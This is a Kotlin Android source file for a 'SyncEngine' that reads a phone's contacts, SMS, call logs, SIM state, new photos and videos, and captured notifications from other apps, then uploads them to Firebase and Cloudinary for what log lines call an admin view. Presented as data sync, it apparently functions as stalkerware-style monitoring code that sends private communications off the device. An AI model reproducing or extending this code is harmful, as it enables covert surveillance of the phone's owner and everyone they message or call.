package com.boxx.datasync.sync

import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.preference.PreferenceManager
import com.boxx.datasync.data.local.NotificationDao
import com.boxx.datasync.domain.model.NotificationData
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.utils.DataHelper
import com.boxx.datasync.utils.DeviceIdHelper
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.tasks.await
import javax.inject.Inject
import javax.inject.Singleton

sealed class SyncResult {
    object Success : SyncResult()
    data class Error(val message: String) : SyncResult()
    object PermissionMissing : SyncResult()
}

@Singleton
class SyncEngine @Inject constructor(
    private val repository: DataRepository,
    private val notificationDao: NotificationDao
) {
    suspend fun runSync(context: Context, isFullSync: Boolean): SyncResult {
        Log.d("SyncEngine", "SYNC_ENGINE_STARTED isFullSync=$isFullSync")
        Log.d("SyncEngine", "BACKGROUND_SYNC_STARTED")
        if (isFullSync) Log.d("SyncEngine", "CLIENT_FULL_SYNC_STARTED")

        val deviceId = DeviceIdHelper.getDeviceId(context)
        val prefs = PreferenceManager.getDefaultSharedPreferences(context)
        val now = System.currentTimeMillis()

        try {
            repository.updateDeviceInfoMap(deviceId, baseDeviceMap(deviceId, now) + mapOf(
                "syncStatus" to "Syncing",
                "lastError" to null
            ))

            val lastSmsSync = if (isFullSync) 0L else prefs.getLong("last_sms_sync", 0L)
            val lastCallSync = if (isFullSync) 0L else prefs.getLong("last_call_sync", 0L)
            val lastContactSync = if (isFullSync) 0L else prefs.getLong("last_contact_sync", 0L)
            val lastMediaSync = if (isFullSync) 0L else prefs.getLong("last_media_sync", 0L)

            val contactsAllowed = hasPermission(context, android.Manifest.permission.READ_CONTACTS)
            val smsAllowed = hasPermission(context, android.Manifest.permission.READ_SMS)
            val callsAllowed = hasPermission(context, android.Manifest.permission.READ_CALL_LOG)

            Log.d("SyncEngine", "SYNC_ENGINE_PERMISSION_STATUS contacts=$contactsAllowed sms=$smsAllowed calls=$callsAllowed")

            if (!contactsAllowed && !smsAllowed && !callsAllowed) {
                val missing = mutableListOf<String>()
                if (!contactsAllowed) missing.add("READ_CONTACTS")
                if (!smsAllowed) missing.add("READ_SMS")
                if (!callsAllowed) missing.add("READ_CALL_LOG")
                val error = "FAILED: Missing permissions: ${missing.joinToString(", ")}"
                repository.updateDeviceInfoMap(deviceId, baseDeviceMap(deviceId, now) + mapOf(
                    "syncStatus" to "Error",
                    "lastError" to error,
                    "lastSyncTime" to now
                ))
                Log.e("SyncEngine", "BACKGROUND_SYNC_FAILED: $error")
                return SyncResult.PermissionMissing
            }

            Log.d("SyncEngine", "SYNC_UPLOAD_STARTED")
            Log.d("SyncEngine", "SMS_BACKGROUND_SYNC_STARTED")

            val contacts = if (contactsAllowed) DataHelper.fetchContacts(context, sinceTimestamp = lastContactSync) else emptyList()
            val sms = if (smsAllowed) DataHelper.fetchSMS(context, sinceTimestamp = lastSmsSync) else emptyList()
            val calls = if (callsAllowed) DataHelper.fetchCallLogs(context, sinceTimestamp = lastCallSync) else emptyList()

            repository.syncIncremental(deviceId, contacts, sms, calls)

            // Auto Media Sync
            val autoMediaSyncEnabled = prefs.getBoolean("auto_media_sync", false)
            val mediaImagesAllowed = hasPermission(context, android.Manifest.permission.READ_MEDIA_IMAGES) ||
                                     hasPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE)
            val mediaVideosAllowed = hasPermission(context, android.Manifest.permission.READ_MEDIA_VIDEO) ||
                                     hasPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE)

            if (autoMediaSyncEnabled && (mediaImagesAllowed || mediaVideosAllowed)) {
                Log.d("SyncEngine", "AUTO_MEDIA_SYNC_STARTED")
                val newMedia = com.boxx.datasync.utils.MediaHelper.fetchNewMedia(context, lastMediaSync)
                Log.d("SyncEngine", "AUTO_MEDIA_SYNC_FOUND: ${newMedia.size} items")
                newMedia.forEachIndexed { index, media ->
                    Log.d("SyncEngine", "AUTO_MEDIA_SYNC_UPLOADING: ${index + 1}/${newMedia.size} - ${media.fileName}")
                    try {
                        repository.updateDeviceInfoMap(deviceId, mapOf("syncStatus" to "Syncing Media (${index + 1}/${newMedia.size})"))
                    } catch (_: Exception) {}
                    CloudinaryUploader.uploadMedia(context, media.uri, deviceId)
                }
                Log.d("SyncEngine", "AUTO_MEDIA_SYNC_COMPLETED")
                prefs.edit().putLong("last_media_sync", now).apply()
            }

            if (isFullSync) {
                val cachedNotifications = notificationDao.getAll().map { entity ->
                    NotificationData(
                        id = entity.id,
                        appName = entity.appName,
                        packageName = entity.packageName,
                        title = entity.title,
                        text = entity.text,
                        timestamp = entity.timestamp,
                        groupKey = entity.groupKey,
                        iconBase64 = entity.iconBase64,
                        sender = entity.sender,
                        conversationId = entity.conversationId
                    )
                }
                for (notification in cachedNotifications) {
                    repository.syncNotification(deviceId, notification)
                }
                Log.d("SyncEngine", "RESTORE_AFTER_DELETE_COMPLETED: restored ${cachedNotifications.size} notifications")
            }

            prefs.edit().apply {
                if (contacts.isNotEmpty()) putLong("last_contact_sync", now)
                if (sms.isNotEmpty()) putLong("last_sms_sync", sms.maxOfOrNull { it.date } ?: now)
                if (calls.isNotEmpty()) putLong("last_call_sync", calls.maxOfOrNull { it.date } ?: now)
            }.apply()

            val simState = DataHelper.getSimState(context)

            val notificationCount = try {
                FirebaseFirestore.getInstance().collection("devices").document(deviceId)
                    .collection("notifications").get().await().size()
            } catch (e: Exception) {
                0
            }

            repository.updateDeviceInfoMap(deviceId, baseDeviceMap(deviceId, System.currentTimeMillis()) + simState + mapOf(
                "lastSyncTime" to System.currentTimeMillis(),
                "syncStatus" to "Synced",
                "lastError" to null,
                "contactCount" to if (contactsAllowed) DataHelper.fetchContacts(context).size else 0,
                "smsCount" to if (smsAllowed) DataHelper.fetchSMS(context).size else 0,
                "callCount" to if (callsAllowed) DataHelper.fetchCallLogs(context).size else 0,
                "notificationCount" to notificationCount
            ))

            Log.d("SyncEngine", "SYNC_UPLOAD_SUCCESS")
            Log.d("SyncEngine", "BACKGROUND_SYNC_SUCCESS")
            Log.d("SyncEngine", "SMS_BACKGROUND_SYNC_SUCCESS")
            if (isFullSync) Log.d("SyncEngine", "CLIENT_FULL_SYNC_SUCCESS")
            Log.d("SyncEngine", "ADMIN_REALTIME_UPDATED")
            return SyncResult.Success
        } catch (e: Exception) {
            val message = e.localizedMessage ?: e.message ?: e.javaClass.simpleName
            Log.e("SyncEngine", "SYNC_UPLOAD_FAILED", e)
            Log.e("SyncEngine", "BACKGROUND_SYNC_FAILED: $message")
            Log.e("SyncEngine", "SMS_BACKGROUND_SYNC_FAILED: $message")
            if (isFullSync) Log.d("SyncEngine", "CLIENT_FULL_SYNC_FAILED")
            try {
                repository.updateDeviceInfoMap(deviceId, baseDeviceMap(deviceId, System.currentTimeMillis()) + mapOf(
                    "lastSyncTime" to System.currentTimeMillis(),
                    "syncStatus" to "Error",
                    "lastError" to message
                ))
            } catch (_: Exception) {}
            return SyncResult.Error(message)
        }
    }

    private fun hasPermission(context: Context, permission: String) =
        ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED

    private fun baseDeviceMap(deviceId: String, now: Long): Map<String, Any?> = mapOf(
        "deviceId" to deviceId,
        "deviceName" to "${Build.MANUFACTURER} ${Build.MODEL}",
        "manufacturer" to Build.MANUFACTURER,
        "model" to Build.MODEL,
        "osVersion" to Build.VERSION.RELEASE,
        "heartbeatAt" to now,
        "timestamp" to now
    )
}
